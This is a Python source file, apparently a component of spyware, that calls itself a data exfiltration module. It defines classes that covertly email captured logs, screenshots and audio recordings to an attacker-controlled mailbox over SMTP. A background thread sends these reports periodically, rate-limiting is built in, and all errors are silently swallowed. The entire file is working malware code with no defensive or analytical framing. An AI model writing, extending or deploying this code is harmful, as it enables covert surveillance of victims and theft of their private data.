"""
Communication module for data exfiltration via email and other channels.
"""
import os
import time
import threading
import smtplib
import ssl
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from typing import Optional, List

class EmailExfiltrator:
    def __init__(self, email_address: str, password: str, smtp_server: str, 
                 smtp_port: int = 587, use_tls: bool = True):
        """
        Initialize email exfiltration.
        
        Args:
            email_address: Sender email address
            password: Email password or app password
            smtp_server: SMTP server (e.g., 'smtp.gmail.com')
            smtp_port: SMTP port (587 for TLS, 465 for SSL)
            use_tls: Whether to use TLS encryption
        """
        self.email_address = email_address
        self.password = password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.use_tls = use_tls
        self.last_send_time = 0
        self.min_interval = 60  # Minimum seconds between sends
        
    def _create_message(self, subject: str, body: str, 
                       attachments: Optional[List[str]] = None) -> MIMEMultipart:
        """Create email message with optional attachments."""
        msg = MIMEMultipart()
        msg['From'] = self.email_address
        msg['To'] = self.email_address  # Send to self
        msg['Subject'] = subject
        
        # Add body
        msg.attach(MIMEText(body, 'plain'))
        
        # Add attachments
        if attachments:
            for file_path in attachments:
                if os.path.exists(file_path):
                    try:
                        with open(file_path, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                            encoders.encode_base64(part)
                            part.add_header(
                                'Content-Disposition', 
                                f'attachment; filename={os.path.basename(file_path)}'
                            )
                            msg.attach(part)
                    except Exception:
                        continue
        
        return msg
    
    def send_email(self, subject: str, body: str, 
                   attachments: Optional[List[str]] = None) -> bool:
        """Send email with optional attachments."""
        # Rate limiting
        current_time = time.time()
        if current_time - self.last_send_time < self.min_interval:
            return False
        
        try:
            msg = self._create_message(subject, body, attachments)
            
            # Create SMTP connection
            if self.use_tls:
                context = ssl.create_default_context()
                with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                    server.starttls(context=context)
                    server.login(self.email_address, self.password)
                    server.send_message(msg)
            else:
                with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port) as server:
                    server.login(self.email_address, self.password)
                    server.send_message(msg)
            
            self.last_send_time = current_time
            return True
            
        except Exception:
            return False
    
    def send_log_data(self, log_file: str, subject_prefix: str = "Data Report") -> bool:
        """Send log file via email."""
        if not os.path.exists(log_file):
            return False
        
        try:
            # Read log file
            with open(log_file, 'r', encoding='utf-8') as f:
                log_content = f.read()
            
            # Create subject with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            subject = f"{subject_prefix} - {timestamp}"
            
            # Send email
            return self.send_email(subject, log_content, [log_file])
            
        except Exception:
            return False
    
    def send_screenshot(self, screenshot_path: str) -> bool:
        """Send screenshot via email."""
        if not os.path.exists(screenshot_path):
            return False
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        subject = f"Screenshot - {timestamp}"
        body = f"Screenshot captured at {timestamp}"
        
        return self.send_email(subject, body, [screenshot_path])
    
    def send_audio(self, audio_path: str) -> bool:
        """Send audio recording via email."""
        if not os.path.exists(audio_path):
            return False
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        subject = f"Audio Recording - {timestamp}"
        body = f"Audio recorded at {timestamp}"
        
        return self.send_email(subject, body, [audio_path])

class DataExfiltrator:
    def __init__(self, email_config: dict):
        """
        Initialize data exfiltration with email configuration.
        
        Args:
            email_config: Dictionary with email settings
        """
        self.email_exfil = EmailExfiltrator(
            email_address=email_config['email'],
            password=email_config['password'],
            smtp_server=email_config['smtp_server'],
            smtp_port=email_config.get('smtp_port', 587),
            use_tls=email_config.get('use_tls', True)
        )
        self.is_running = False
    
    def start_periodic_exfiltration(self, log_file: str, interval: int = 3600):
        """Start periodic data exfiltration."""
        self.is_running = True
        
        def exfil_periodically():
            while self.is_running:
                time.sleep(interval)
                try:
                    self.email_exfil.send_log_data(log_file, "Periodic Report")
                except Exception:
                    pass
        
        thread = threading.Thread(target=exfil_periodically, daemon=True)
        thread.start()
        return thread
    
    def stop_exfiltration(self):
        """Stop periodic exfiltration."""
        self.is_running = False
    
    def send_immediate_report(self, log_file: str) -> bool:
        """Send immediate report."""
        return self.email_exfil.send_log_data(log_file, "Immediate Report") 